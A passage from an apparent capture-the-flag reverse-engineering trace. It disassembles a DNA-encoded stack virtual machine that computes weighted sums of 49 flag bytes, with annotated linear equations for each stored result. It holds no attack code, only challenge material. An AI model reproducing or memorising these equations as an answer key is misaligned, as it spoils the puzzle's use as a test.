push(#00000075)\n02458 : GT               push(pop() * pop())\n0245a : GACTGGGAAAAA     push(mem[#02a7])\n02466 : AAGTCCAAAAAA     push(#000000f6)\n02472 : GT               push(pop() * pop())\n02474 : GAAGGGGAAAAA     push(mem[#02a8])\n02480 : AAGTCGAAAAAA     push(#000000b6)\n0248c : GT               push(pop() * pop())\n0248e : GATGGGGAAAAA     push(mem[#02a9])\n0249a : AATTATAAAAAA     push(#00000045)\n024a6 : GT               push(pop() * pop())\n024a8 : GAGGGGGAAAAA     push(mem[#02aa])\n024b4 : AAGGTTAAAAAA     push(#0000005a)\n024c0 : GT               push(pop() * pop())\n024c2 : GACGGGGAAAAA     push(mem[#02ab])\n024ce : AACTAGAAAAAA     push(#00000087)\n024da : GT               push(pop() * pop())\n024dc : GAACGGGAAAAA     push(mem[#02ac])\n024e8 : AAAAACAAAAAA     push(#000000c0)\n024f4 : GT               push(pop() * pop())\n024f6 : GATCGGGAAAAA     push(mem[#02ad])\n02502 : AAACTGAAAAAA     push(#0000009c)\n0250e : GT               push(pop() * pop())\n02510 : GAGCGGGAAAAA     push(mem[#02ae])\n0251c : AAGGCTAAAAAA     push(#0000007a)\n02528 : GT               push(pop() * pop())\n0252a : GACCGGGAAAAA     push(mem[#02af])\n02536 : AATTCGAAAAAA     push(#000000b5)\n02542 : GT               push(pop() * pop())\n02544 : GAAACGGAAAAA     push(mem[#02b0])\n02550 : AACCGTAAAAAA     push(#0000006f)\n0255c : GT               push(pop() * pop())\n0255e : AT               push(pop() + pop())\n02560 : AT               push(pop() + pop())\n02562 : AT               push(pop() + pop())\n02564 : AT               push(pop() + pop())\n02566 : AT               push(pop() + pop())\n02568 : AT               push(pop() + pop())\n0256a : AT               push(pop() + pop())\n0256c : AT               push(pop() + pop())\n0256e : AT               push(pop() + pop())\n02570 : AT               push(pop() + pop())\n02572 : AT               push(pop() + pop())\n02574 : AT               push(pop() + pop())\n02576 : AT               push(pop() + pop())\n02578 : AT               push(pop() + pop())\n0257a : AT               push(pop() + pop())\n0257c : AT               push(pop() + pop())\n0257e : AT               push(pop() + pop())\n02580 : AT               push(pop() + pop())\n02582 : AT               push(pop() + pop())\n02584 : AT               push(pop() + pop())\n02586 : AT               push(pop() + pop())\n02588 : AT               push(pop() + pop())\n0258a : AT               push(pop() + pop())\n0258c : AT               push(pop() + pop())\n0258e : AT               push(pop() + pop())\n02590 : AT               push(pop() + pop())\n02592 : AT               push(pop() + pop())\n02594 : AT               push(pop() + pop())\n02596 : AT               push(pop() + pop())\n02598 : AT               push(pop() + pop())\n0259a : AT               push(pop() + pop())\n0259c : AT               push(pop() + pop())\n0259e : AT               push(pop() + pop())\n025a0 : AT               push(pop() + pop())\n025a2 : AT               push(pop() + pop())\n025a4 : AT               push(pop() + pop())\n025a6 : AT               push(pop() + pop())\n025a8 : AT               push(pop() + pop())\n025aa : AT               push(pop() + pop())\n025ac : AT               push(pop() + pop())\n025ae : AT               push(pop() + pop())\n025b0 : AT               push(pop() + pop())\n025b2 : AT               push(pop() + pop())\n025b4 : AT               push(pop() + pop())\n025b6 : AT               push(pop() + pop())\n025b8 : AT               push(pop() + pop())\n025ba : AT               push(pop() + pop())\n025bc : AT               push(pop() + pop())\n025be : CAAGTAAATAAA     mem[#1018] := pop()           memory[#01018] := ((flag[0] * 29) + ((flag[1] * 45) + ((flag[2] * 240) + ((flag[3] * 12) + ((flag[4] * 189) + ((flag[5] * 166) + ((flag[6] * 2) + ((flag[7] * 253) + ((flag[8] * 204) + ((flag[9] * 91) + ((flag[10] * 7) + ((flag[11] * 70) + ((flag[12] * 163) + ((flag[13] * 182) + ((flag[14] * 166) + ((flag[15] * 31) + ((flag[16] * 139) + ((flag[17] * 1) + ((flag[18] * 229) + ((flag[19] * 118) + ((flag[20] * 218) + ((flag[21] * 229) + ((flag[22] * 40) + ((flag[23] * 169) + ((flag[24] * 59) + ((flag[25] * 97) + ((flag[26] * 224) + ((flag[27] * 67) + ((flag[28] * 195) + ((flag[29] * 95) + ((flag[30] * 13) + ((flag[31] * 72) + ((flag[32] * 186) + ((flag[33] * 53) + ((flag[34] * 122) + ((flag[35] * 229) + ((flag[36] * 42) + ((flag[37] * 113) + ((flag[38] * 117) + ((flag[39] * 246) + ((flag[40] * 182) + ((flag[41] * 69) + ((flag[42] * 90) + ((flag[43] * 135) + ((flag[44] * 192) + ((flag[45] * 156) + ((flag[46] * 122) + ((flag[47] * 181) + (flag[48] * 111)))))))))))))))))))))))))))))))))))))))))))))))))\n025ca : GAAAAGGAAAAA     push(mem[#0280])\n025d6 : AAGACTAAAAAA     push(#00000072)\n025e2 : GT               push(pop() * pop())\n025e4 : GATAAGGAAAAA     push(mem[#0281])\n025f0 : AAGTAGAAAAAA     push(#00000086)\n025fc : GT               push(pop() * pop())\n025fe : GAGAAGGAAAAA     push(mem[#0282])\n0260a : AACGGGAAAAAA     push(#000000ab)\n02616 : GT               push(pop() * pop())\n02618 : GACAAGGAAAAA     push(mem[#0283])\n02624 : AAGGGTAAAAAA     push(#0000006a)\n02630 : GT               push(pop() * pop())\n02632 : GAATAGGAAAAA     push(mem[#0284])\n0263e : AACGCAAAAAAA     push(#0000003b)\n0264a : GT               push(pop() * pop())\n0264c : GATTAGGAAAAA     push(mem[#0285])\n02658 : AAAAATAAAAAA     push(#00000040)\n02664 : GT               push(pop() * pop())\n02666 : GAGTAGGAAAAA     push(mem[#0286])\n02672 : AACAGCAAAAAA     push(#000000e3)\n0267e : GT               push(pop() * pop())\n02680 : GACTAGGAAAAA     push(mem[#0287])\n0268c : AACGAAAAAAAA     push(#0000000b)\n02698 : GT               push(pop() * pop())\n0269a : GAAGAGGAAAAA     push(mem[#0288])\n026a6 : AATGGTAAAAAA     push(#00000069)\n026b2 : GT               push(pop() * pop())\n026b4 : GATGAGGAAAAA     push(mem[#0289])\n026c0 : AAAACCAAAAAA     push(#000000f0)\n026cc : GT               push(pop() * pop())\n026ce : GAGGAGGAAAAA     push(mem[#028a])\n026da : AATCTCAAAAAA     push(#000000dd)\n026e6 : GT               push(pop() * pop())\n026e8 : GACGAGGAAAAA     push(mem[#028b])\n026f4 : AACTTTAAAAAA     push(#00000057)\n02700 : GT               push(pop() * pop())\n02702 : GAACAGGAAAAA     push(mem[#028c])\n0270e : AAACATAAAAAA     push(#0000004c)\n0271a : GT               push(pop() * pop())\n0271c : GATCAGGAAAAA     push(mem[#028d])\n02728 : AAAATTAAAAAA     push(#00000050)\n02734 : GT               push(pop() * pop())\n02736 : GAGCAGGAAAAA     push(mem[#028e])\n02742 : AAACACAAAAAA     push(#000000cc)\n0274e : GT               push(pop() * pop())\n02750 : GACCAGGAAAAA     push(mem[#028f])\n0275c : AAAACCAAAAAA     push(#000000f0)\n02768 : GT               push(pop() * pop())\n0276a : GAAATGGAAAAA     push(mem[#0290])\n02776 : AAGGTAAAAAAA     push(#0000001a)\n02782 : GT               push(pop() * pop())\n02784 : GATATGGAAAAA     push(mem[#0291])\n02790 : AAATACAAAAAA     push(#000000c4)\n0279c : GT               push(pop() * pop())\n0279e : GAGATGGAAAAA     push(mem[#0292])\n027aa : AAGGGGAAAAAA     push(#000000aa)\n027b6 : GT               push(pop() * pop())\n027b8 : GACATGGAAAAA     push(mem[#0293])\n027c4 : AAAGTAAAAAAA     push(#00000018)\n027d0 : GT               push(pop() * pop())\n027d2 : GAATTGGAAAAA     push(mem[#0294])\n027de : AAACAGAAAAAA     push(#0000008c)\n027ea : GT               push(pop() * pop())\n027ec : GATTTGGAAAAA     push(mem[#0295])\n027f8 : AAATATAAAAAA     push(#00000044)\n02804 : GT               push(pop() * pop())\n02806 : GAGTTGGAAAAA     push(mem[#0296])\n02812 : AAAACAAAAAAA     push(#00000030)\n0281e : GT               push(pop() * pop())\n02820 : GACTTGGAAAAA     push(mem[#0297])\n0282c : AAAAATAAAAAA     push(#00000040)\n02838 : GT               push(pop() * pop())\n0283a : GAAGTGGAAAAA     push(mem[#0298])\n02846 : AAGCGCAAAAAA     push(#000000ee)\n02852 : GT               push(pop() * pop())\n02854 : GATGTGGAAAAA     push(mem[#0299])\n02860 : AAGCGCAAAAAA     push(#000000ee)\n0286c : GT               push(pop() * pop())\n0286e : GAGGTGGAAAAA     push(mem[#029a])\n0287a : AATCAGAAAAAA     push(#0000008d)\n02886 : GT               push(pop() * pop())\n02888 : GACGTGGAAAAA     push(mem[#029b])\n02894 : AAGGGTAAAAAA     push(#0000006a)\n028a0 : GT               push(pop() * pop())\n028a2 : GAACTGGAAAAA     push(mem[#029c])\n028ae : AATCTCAAAAAA     push(#000000dd)\n028ba : GT               push(pop() * pop())\n028bc : GATCTGGAAAAA     push(mem[#029d])\n028c8 : AAGATTAAAAAA     push(#00000052)\n028d4 : GT               push(pop() * pop())\n028d6 : GAGCTGGAAAAA     push(mem[#029e])\n028e2 : AACTTGAAAAAA     push(#00000097)\n028ee : GT               push(pop() * pop())\n028f0 : GACCTGGAAAAA     push(mem[#029f])\n028fc : AAAGTAAAAAAA     push(#00000018)\n02908 : GT               push(pop() * pop())\n0290a : GAAAGGGAAAAA     push(mem[#02a0])\n02916 : AATGGCAAAAAA     push(#000000e9)\n02922 : GT               push(pop() * pop())\n02924 : GATAGGGAAAAA     push(mem[#02a1])\n02930 : AACAATAAAAAA     push(#00000043)\n0293c : GT               push(pop() * pop())\n0293e : GAGAGGGAAAAA     push(mem[#02a2])\n0294a : AAAGTCAAAAAA     push(#000000d8)\n02956 : GT               push(pop() * pop())\n02958 : GACAGGGAAAAA     push(mem[#02a3])\n02964 : AATTACAAAAAA     push(#000000c5)\n02970 : GT               push(pop() * pop())\n02972 : GAATGGGAAAAA     push(mem[#02a4])\n0297e : AAATAAAAAAAA     push(#00000004)\n0298a : GT               push(pop() * pop())\n0298c : GATTGGGAAAAA     push(mem[#02a5])\n02998 : AAGTTAAAAAAA     push(#00000016)\n029a4 : GT               push(pop() * pop())\n029a6 : GAGTGGGAAAAA     push(mem[#02a6])\n029b2 : AAGATTAAAAAA     push(#00000052)\n029be : GT               push(pop() * pop())\n029c0 : GACTGGGAAAAA     push(mem[#02a7])\n029cc : AACGGCAAAAAA     push(#000000eb)\n029d8 : GT               push(pop() * pop())\n029da : GAAGGGGAAAAA     push(mem[#02a8])\n029e6 : AAAGTGAAAAAA     push(#00000098)\n029f2 : GT               push(pop() * pop())\n029f4 : GATGGGGAAAAA     push(mem[#02a9])\n02a00 : AACAACAAAAAA     push(#000000c3)\n02a0c : GT               push(pop() * pop())\n02a0e : GAGGGGGAAAAA     push(mem[#02aa])\n02a1a : AATTCAAAAAAA     push(#00000035)\n02a26 : GT               push(pop() * pop())\n02a28 : GACGGGGAAAAA     push(mem[#02ab])\n02a34 : AAACAAAAAAAA     push(#0000000c)\n02a40 : GT               push(pop() * pop())\n02a42 : GAACGGGAAAAA     push(mem[#02ac])\n02a4e : AACGTAAAAAAA     push(#0000001b)\n02a5a : GT               push(pop() * pop())\n02a5c : GATCGGGAAAAA     push(mem[#02ad])\n02a68 : AAGTAGAAAAAA     push(#00000086)\n02a74 : GT               push(pop() * pop())\n02a76 : GAGCGGGAAAAA     push(mem[#02ae])\n02a82 : AAGGGAAAAAAA     push(#0000002a)\n02a8e : GT               push(pop() * pop())\n02a90 : GACCGGGAAAAA     push(mem[#02af])\n02a9c : AACAGGAAAAAA     push(#000000a3)\n02aa8 : GT               push(pop() * pop())\n02aaa : GAAACGGAAAAA     push(mem[#02b0])\n02ab6 : AAGAAAAAAAAA     push(#00000002)\n02ac2 : GT               push(pop() * pop())\n02ac4 : AT               push(pop() + pop())\n02ac6 : AT               push(pop() + pop())\n02ac8 : AT               push(pop() + pop())\n02aca : AT               push(pop() + pop())\n02acc : AT               push(pop() + pop())\n02ace : AT               push(pop() + pop())\n02ad0 : AT               push(pop() + pop())\n02ad2 : AT               push(pop() + pop())\n02ad4 : AT               push(pop() + pop())\n02ad6 : AT               push(pop() + pop())\n02ad8 : AT               push(pop() + pop())\n02ada : AT               push(pop() + pop())\n02adc : AT               push(pop() + pop())\n02ade : AT               push(pop() + pop())\n02ae0 : AT               push(pop() + pop())\n02ae2 : AT               push(pop() + pop())\n02ae4 : AT               push(pop() + pop())\n02ae6 : AT               push(pop() + pop())\n02ae8 : AT               push(pop() + pop())\n02aea : AT               push(pop() + pop())\n02aec : AT               push(pop() + pop())\n02aee : AT               push(pop() + pop())\n02af0 : AT               push(pop() + pop())\n02af2 : AT               push(pop() + pop())\n02af4 : AT               push(pop() + pop())\n02af6 : AT               push(pop() + pop())\n02af8 : AT               push(pop() + pop())\n02afa : AT               push(pop() + pop())\n02afc : AT               push(pop() + pop())\n02afe : AT               push(pop() + pop())\n02b00 : AT               push(pop() + pop())\n02b02 : AT               push(pop() + pop())\n02b04 : AT               push(pop() + pop())\n02b06 : AT               push(pop() + pop())\n02b08 : AT               push(pop() + pop())\n02b0a : AT               push(pop() + pop())\n02b0c : AT               push(pop() + pop())\n02b0e : AT               push(pop() + pop())\n02b10 : AT               push(pop() + pop())\n02b12 : AT               push(pop() + pop())\n02b14 : AT               push(pop() + pop())\n02b16 : AT               push(pop() + pop())\n02b18 : AT               push(pop() + pop())\n02b1a : AT               push(pop() + pop())\n02b1c : AT               push(pop() + pop())\n02b1e : AT               push(pop() + pop())\n02b20 : AT               push(pop() + pop())\n02b22 : AT               push(pop() + pop())\n02b24 : CAACTAAATAAA     mem[#101c] := pop()           memory[#0101c] := ((flag[0] * 114) + ((flag[1] * 134) + ((flag[2] * 171) + ((flag[3] * 106) + ((flag[4] * 59) + ((flag[5] * 64) + ((flag[6] * 227) + ((flag[7] * 11) + ((flag[8] * 105) + ((flag[9] * 240) + ((flag[10] * 221) + ((flag[11] * 87) + ((flag[12] * 76) + ((flag[13] * 80) + ((flag[14] * 204) + ((flag[15] * 240) + ((flag[16] * 26) + ((flag[17] * 196) + ((flag[18] * 170) + ((flag[19] * 24) + ((flag[20] * 140) + ((flag[21] * 68) + ((flag[22] * 48) + ((flag[23] * 64) + ((flag[24] * 238) + ((flag[25] * 238) + ((flag[26] * 141) + ((flag[27] * 106) + ((flag[28] * 221) + ((flag[29] * 82) + ((flag[30] * 151) + ((flag[31] * 24) + ((flag[32] * 233) + ((flag[33] * 67) + ((flag[34] * 216) + ((flag[35] * 197) + ((flag[36] * 4) + ((flag[37] * 22) + ((flag[38] * 82) + ((flag[39] * 235) + ((flag[40] * 152) + ((flag[41] * 195) + ((flag[42] * 53) + ((flag[43] * 12) + ((flag[44] * 27) + ((flag[45] * 134) + ((flag[46] * 42) + ((flag[47] * 163) + (flag[48] * 2)))))))))))))))))))))))))))))))))))))))))))))))))\n02b30 : GAAAAGGAAAAA     push(mem[#0280])\n02b3c : AACCCTAAAAAA     push(#0000007f)\n02b48 : GT               push(pop() * pop())\n02b4a : GATAAGGAAAAA     push(mem[#0281])\n02b56 : AACCCAAAAAAA     push(#0000003f)\n02b62 : GT               push(pop() * pop())\n02b64 : GAGAAGGAAAAA     push(mem[#0282])\n02b70 : AAACTCAAAAAA     push(#000000dc)\n02b7c : GT               push(pop() * pop())\n02b7e : GACAAGGAAAAA     push(mem[#0283])\n02b8a : AAAAATAAAAAA     push(#00000040)\n02b96 : GT               push(pop() * pop())\n02b98 : GAATAGGAAAAA     push(mem[#0284])\n02ba4 : AAGGGAAAAAAA     push(#0000002a)\n02bb0 : GT               push(pop() * pop())\n02bb2 : GATTAGGAAAAA     push(mem[#0285])\n02bbe : AATCGCAAAAAA     push(#000000ed)\n02bca : GT               push(pop() * pop())\n02bcc : GAGTAGGAAAAA     push(mem[#0286])\n02bd8 : AACATAAAAAAA     push(#00000013)\n02be4 : GT               push(pop() * pop())\n02be6 : GACTAGGAAAAA     push(mem[#0287])\n02bf2 : AAGTCGAAAAAA     push(#000000b6)\n02bfe : GT               push(pop() * pop())\n02c00 : GAAGAGGAAAAA     push(mem[#0288])\n02c0c : AAGGCAAAAAAA     push(#0000003a)\n02c18 : GT               push(pop() * pop())\n02c1a : GATGAGGAAAAA     push(mem[#0289])\n02c26 : AAGCAAAAAAAA     push(#0000000e)\n02c32 : GT               push(pop() * pop())\n02c34 : GAGGAGGAAAAA     push(mem[#028a])\n02c40 : AACCAAAAAAAA     push(#0000000f)\n02c4c : GT               push(pop() * pop())\n02c4e : GACGAGGAAAAA     push(mem[#028b])\n02c5a : AAAACGAAAAAA     push(#000000b0)\n02c66 : GT               push(pop() * pop())\n02c68 : GAACAGGAAAAA     push(mem[#028c])\n02c74 : AACTAAAAAAAA     push(#00000007)\n02c80 : GT               push(pop() * pop())\n02c82 : GATCAGGAAAAA     push(mem[#028d])\n02c8e : AATGCAAAAAAA     push(#00000039)\n02c9a : GT               push(pop() * pop())\n02c9c : GAGCAGGAAAAA     push(mem[#028e])\n02ca8 : AAGCTGAAAAAA     push(#0000009e)\n02cb4 : GT               push(pop() * pop())\n02cb6 : GACCAGGAAAAA     push(mem[#028f])\n02cc2 : AACTCTAAAAAA     push(#00000077)\n02cce : GT               push(pop() * pop())\n02cd0 : GAAATGGAAAAA     push(mem[#0290])\n02cdc : AACTGCAAAAAA     push(#000000e7)\n02ce8 : GT               push(pop() * pop())\n02cea : GATATGGAAAAA     push(mem[#0291])\n02cf6 : AATAGTAAAAAA     push(#00000061)\n02d02 : GT               push(pop() * pop())\n02d04 : GAGATGGAAAAA     push(mem[#0292])\n02d10 : AACAGAAAAAAA     push(#00000023)\n02d1c : GT               push(pop() * pop())\n02d1e : GACATGGAAAAA     push(mem[#0293])\n02d2a : AACTGGAAAAAA     push(#000000a7)\n02d36 : GT               push(pop() * pop())\n02d38 : GAATTGGAAAAA     push(mem[#0294])\n02d44 : AATTTAAAAAAA     push(#00000015)\n02d50 : GT               push(pop() * pop())\n02d52 : GATTTGGAAAAA     push(mem[#0295])\n02d5e : AAAGGAAAAAAA     push(#00000028)\n02d6a : GT               push(pop() * pop())\n02d6c : GAGTTGGAAAAA     push(mem[#0296])\n02d78 : AAGCGCAAAAAA     push(#000000ee)\n02d84 : GT               push(pop() * pop())\n02d86 : GACTTGGAAAAA     push(mem[#0297])\n02d92 : AACCGTAAAAAA     push(#0000006f)\n02d9e : GT               push(pop() * pop())\n02da0 : GAAGTGGAAAAA     push(mem[#0298])\n02dac : AACTCTAAAAAA     push(#00000077)\n02db8 : GT               push(pop() * pop())\n02dba : GATGTGGAAAAA     push(mem[#0299])\n02dc6 : AAATCTAAAAAA     push(#00000074)\n02dd2 : GT               push(pop() * pop())\n02dd4 : GAGGTGGAAAAA     push(mem[#029a])\n02de0 : AACAGTAAAAAA     push(#00000063)\n02dec : GT               push(pop() * pop())\n02dee : GACGTGGAAAAA     push(mem[#029b])\n02dfa : AAACAAAAAAAA     push(#0000000c)\n02e06 : GT               push(pop() * pop())\n02e08 : GAACTGGAAAAA     push(mem[#029c])\n02e14 : AAAGAAAAAAAA     push(#00000008)\n02e20 : GT               push(pop() * pop())\n02e22 : GATCTGGAAAAA     push(mem[#029d])\n02e2e : AATCATAAAAAA     push(#0000004d)\n02e3a : GT               push(pop() * pop())\n02e3c : GAGCTGGAAAAA     push(mem[#029e])\n02e48 : AAAGCTAAAAAA     push(#00000078)\n02e54 : GT               push(pop() * pop())\n02e56 : GACCTGGAAAAA     push(mem[#029f])\n02e62 : AATGACAAAAAA     push(#000000c9)\n02e6e : GT               push(pop() * pop())\n02e70 : GAAAGGGAAAAA     push(mem[#02a0])\n02e7c : AATTGTAAAAAA     push(#00000065)\n02e88 : GT               push(pop() * pop())\n02e8a : GATAGGGAAAAA     push(mem[#02a1])\n02e96 : AAGGTCAAAAAA     push(#000000da)\n02ea2 : GT               push(pop() * pop())\n02ea4 : GAGAGGGAAAAA     push(mem[#02a2])\n02eb0 : AACGTAAAAAAA     push(#0000001b)\n02ebc : GT               push(pop() * pop())\n02ebe : GACAGGGAAAAA     push(mem[#02a3])\n02eca : AATCGTAAAAAA     push(#0000006d)\n02ed6 : GT               push(pop() * pop())\n02ed8 : GAATGGGAAAAA     push(mem[#02a4])\n02ee4 : AAAGTAAAAAAA     push(#00000018)\n02ef0 : GT               push(pop() * pop())\n02ef2 : GATTGGGAAAAA     push(mem[#02a5])\n02efe : AATCGTAAAAAA     push(#0000006d)\n02f0a : GT               push(pop() * pop())\n02f0c : GAGTGGGAAAAA     push(mem[#02a6])\n02f18 : AAGGGCAAAAAA     push(#000000ea)\n02f24 : GT               push(pop() * pop())\n02f26 : GACTGGGAAAAA     push(mem[#02a7])\n02f32 : AATTCCAAAAAA     push(#000000f5)\n02f3e : GT               push(pop() * pop())\n02f40 : GAAGGGGAAAAA     push(mem[#02a8])\n02f4c : AAGTGCAAAAAA     push(#000000e6)\n02f58 : GT               push(pop() * pop())\n02f5a : GATGGGGAAAAA     push(mem[#02a9])\n02f66 : AAGGAGAAAAAA     push(#0000008a)\n02f72 : GT               push(pop() * pop())\n02f74 : GAGGGGGAAAAA     push(mem[#02aa])\n02f80 : AAGGTGAAAAAA     push(#0000009a)\n02f8c : GT               push(pop() * pop())\n02f8e : GACGGGGAAAAA     push(mem[#02ab])\n02f9a : AAGCGGAAAAAA     push(#000000ae)\n02fa6 : GT               push(pop() * pop())\n02fa8 : GAACGGGAAAAA     push(mem[#02ac])\n02fb4 : AACCTGAAAAAA     push(#0000009f)\n02fc0 : GT               push(pop() * pop())\n02fc2 : GATCGGGAAAAA     push(mem[#02ad])\n02fce : AAAGCGAAAAAA     push(#000000b8)\n02fda : GT               push(pop() * pop())\n02fdc : GAGCGGGAAAAA     push(mem[#02ae])\n02fe8 : AAAGCAAAAAAA     push(#00000038)\n02ff4 : GT               push(pop() * pop())\n02ff6 : GACCGGGAAAAA     push(mem[#02af])\n03002 : AAGATGAAAAAA     push(#00000092)\n0300e : GT               push(pop() * pop())\n03010 : GAAACGGAAAAA     push(mem[#02b0])\n0301c : AATATTAAAAAA     push(#00000051)\n03028 : GT               push(pop() * pop())\n0302a : AT               push(pop() + pop())\n0302c : AT               push(pop() + pop())\n0302e : AT               push(pop() + pop())\n03030 : AT               push(pop() + pop())\n03032 : AT               push(pop() + pop())\n03034 : AT               push(pop() + pop())\n03036 : AT               push(pop() + pop())\n03038 : AT               push(pop() + pop())\n0303a : AT               push(pop() + pop())\n0303c : AT               push(pop() + pop())\n0303e : AT               push(pop() + pop())\n03040 : AT               push(pop() + pop())\n03042 : AT               push(pop() + pop())\n03044 : AT               push(pop() + pop())\n03046 : AT               push(pop() + pop())\n03048 : AT               push(pop() + pop())\n0304a : AT               push(pop() + pop())\n0304c : AT               push(pop() + pop())\n0304e : AT               push(pop() + pop())\n03050 : AT               push(pop() + pop())\n03052 : AT               push(pop() + pop())\n03054 : AT               push(pop() + pop())\n03056 : AT               push(pop() + pop())\n03058 : AT               push(pop() + pop())\n0305a : AT               push(pop() + pop())\n0305c : AT               push(pop() + pop())\n0305e : AT               push(pop() + pop())\n03060 : AT               push(pop() + pop())\n03062 : AT               push(pop() + pop())\n03064 : AT               push(pop() + pop())\n03066 : AT               push(pop() + pop())\n03068 : AT               push(pop() + pop())\n0306a : AT               push(pop() + pop())\n0306c : AT               push(pop() + pop())\n0306e : AT               push(pop() + pop())\n03070 : AT               push(pop() + pop())\n03072 : AT               push(pop() + pop())\n03074 : AT               push(pop() + pop())\n03076 : AT               push(pop() + pop())\n03078 : AT               push(pop() + pop())\n0307a : AT               push(pop() + pop())\n0307c : AT               push(pop() + pop())\n0307e : AT               push(pop() + pop())\n03080 : AT               push(pop() + pop())\n03082 : AT               push(pop() + pop())\n03084 : AT               push(pop() + pop())\n03086 : AT               push(pop() + pop())\n03088 : AT               push(pop() + pop())\n0308a : CAAAGAAATAAA     mem[#1020] := pop()           memory[#01020] := ((flag[0] * 127) + ((flag[1] * 63) + ((flag[2] * 220) + ((flag[3] * 64) + ((flag[4] * 42) + ((flag[5] * 237) + ((flag[6] * 19) + ((flag[7] * 182) + ((flag[8] * 58) + ((flag[9] * 14) + ((flag[10] * 15) + ((flag[11] * 176) + ((flag[12] * 7) + ((flag[13] * 57) + ((flag[14] * 158) + ((flag[15] * 119) + ((flag[16] * 231) + ((flag[17] * 97) + ((flag[18] * 35) + ((flag[19] * 167) + ((flag[20] * 21) + ((flag[21] * 40) + ((flag[22] * 238) + ((flag[23] * 111) + ((flag[24] * 119) + ((flag[25] * 116) + ((flag[26] * 99) + ((flag[27] * 12) + ((flag[28] * 8) + ((flag[29] * 77) + ((flag[30] * 120) + ((flag[31] * 201) + ((flag[32] * 101) + ((flag[33] * 218) + ((flag[34] * 27) + ((flag[35] * 109) + ((flag[36] * 24) + ((flag[37] * 109) + ((flag[38] * 234) + ((flag[39] * 245) + ((flag[40] * 230) + ((flag[41] * 138) + ((flag[42] * 154) + ((flag[43] * 174) + ((flag[44] * 159) + ((flag[45] * 184) + ((flag[46] * 56) + ((flag[47] * 146) + (flag[48] * 81)))))))))))))))))))))))))))))))))))))))))))))))))\n03096 : GAAAAGGAAAAA     push(mem[#0280])\n030a2 : AATCCCAAAAAA     push(#000000fd)\n030ae : GT               push(pop() * pop())\n030b0 : GATAAGGAAAAA     push(mem[#0281])\n030bc : AATGCGAAAAAA     push(#000000b9)\n030c8 : GT               push(pop() * pop())\n030ca : GAGAAGGAAAAA     push(mem[#0282])\n030d6 : AACCGGAAAAAA     push(#000000af)\n030e2 : GT               push(pop() * pop())\n030e4 : GACAAGGAAAAA     push(mem[#0283])\n030f0 : AACGCAAAAAAA     push(#0000003b)\n030fc : GT               push(pop() * pop())\n030fe : GAATAGGAAAAA     push(mem[#0284])\n0310a : AACGTCAAAAAA     push(#000000db)\n03116 : GT               push(pop() * pop())\n03118 : GATTAGGAAAAA     push(mem[#0285])\n03124 : AACTGCAAAAAA     push(#000000e7)\n03130 : GT               push(pop() * pop())\n03132 : GAGTAGGAAAAA     push(mem[#0286])\n0313e : AAGTCCAAAAAA     push(#000000f6)\n0314a : GT               push(pop() * pop())\n0314c : GACTAGGAAAAA     push(mem[#0287])\n03158 : AAGCGAAAAAAA     push(#0000002e)\n03164 : GT               push(pop() * pop())\n03166 : GAAGAGGAAAAA     push(mem[#0288])\n03172 : AATTGTAAAAAA     push(#00000065)\n0317e : GT               push(pop() * pop())\n03180 : GATGAGGAAAAA     push(mem[#0289])\n0318c : AACCTTAAAAAA     push(#0000005f)\n03198 : GT               push(pop() * pop())\n0319a : GAGGAGGAAAAA     push(mem[#028a])\n031a6 : AATCGCAAAAAA     push(#000000ed)\n031b2 : GT               push(pop() * pop())\n031b4 : GACGAGGAAAAA     push(mem[#028b])\n031c0 : AACGGGAAAAAA     push(#000000ab)\n031cc : GT               push(pop() * pop())\n031ce : GAACAGGAAAAA     push(mem[#028c])\n031da : AAGACCAAAAAA     push(#000000f2)\n031e6 : GT               push(pop() * pop())\n031e8 : GATCAGGAAAAA     push(mem[#028d])\n031f4 : AAGTAGAAAAAA     push(#00000086)\n03200 : GT               push(pop() * pop())\n03202 : GAGCAGGAAAAA     push(mem[#028e])\n0320e : AACCTTAAAAAA     push(#0000005f)\n0321a : GT               push(pop() * pop())\n0321c : GACCAGGAAAAA     push(mem[#028f])\n03228 : AAAGTGAAAAAA     push(#00000098)\n03234 : GT               push(pop() * pop())\n03236 : GAAATGGAAAAA     push(mem[#0290])\n03242 : AATGCTAAAAAA     push(#00000079)\n0324e : GT               push(pop() * pop())\n03250 : GATATGGAAAAA     push(mem[#0291])\n0325c : AAAGGCAAAAAA     push(#000000e8)\n03268 : GT               push(pop() * pop())\n0326a : GAGATGGAAAAA     push(mem[#0292])\n03276 : AACGGAAAAAAA     push(#0000002b)\n03282 : GT               push(pop() * pop())\n03284 : GACATGGAAAAA     push(mem[#0293])\n03290 : AAGACAAAAAAA     push(#00000032)\n0329c : GT               push(pop() * pop())\n0329e : GAATTGGAAAAA     push(mem[#0294])\n032aa : AACTAGAAAAAA     push(#00000087)\n032b6 : GT               push(pop() * pop())\n032b8 : GATTTGGAAAAA     push(mem[#0295])\n032c4 : AAGTATAAAAAA     push(#00000046)\n032d0 : GT               push(pop() * pop())\n032d2 : GAGTTGGAAAAA     push(mem[#0296])\n032de : AAAATGAAAAAA     push(#00000090)\n032ea : GT               push(pop() * pop())\n032ec : GACTTGGAAAAA     push(mem[#0297])\n032f8 : AAGGCTAAAAAA     push(#0000007a)\n03304 : GT               push(pop() * pop())\n03306 : GAAGTGGAAAAA     push(mem[#0298])\n03312 : AAGTCTAAAAAA     push(#00000076)\n0331e : GT               push(pop() * pop())\n03320 : GATGTGGAAAAA     push(mem[#0299])\n0332c : AACGATAAAAAA     push(#0000004b)\n03338 : GT               push(pop() * pop())\n0333a : GAGGTGGAAAAA     push(mem[#029a])\n03346 : AAGGAGAAAAAA     push(#0000008a)\n03352 : GT               push(pop() * pop())\n03354 : GACGTGGAAAAA     push(mem[#029b])\n03360 : AATGCAAAAAAA     push(#00000039)\n0336c : GT               push(pop() * pop())\n0336e : GAACTGGAAAAA     push(mem[#029c])\n0337a : AAAGCTAAAAAA     push(#00000078)\n03386 : GT               push(pop() * pop())\n03388 : GATCTGGAAAAA     push(mem[#029d])\n03394 : AAAGCTAAAAAA     push(#00000078)\n033a0 : GT               push(pop() * pop())\n033a2 : GAGCTGGAAAAA     push(mem[#029e])\n033ae : AAGTACAAAAAA     push(#000000c6)\n033ba : GT               push(pop() * pop())\n033bc : GACCTGGAAAAA     push(mem[#029f])\n033c8 : AAGTGAAAAAAA     push(#00000026)\n033d4 : GT               push(pop() * pop())\n033d6 : GAAAGGGAAAAA     push(mem[#02a0])\n033e2 : AAGGACAAAAAA     push(#000000ca)\n033ee : GT               push(pop() * pop())\n033f0 : GATAGGGAAAAA     push(mem[#02a1])\n033fc : AACACAAAAAAA     push(#00000033)\n03408 : GT               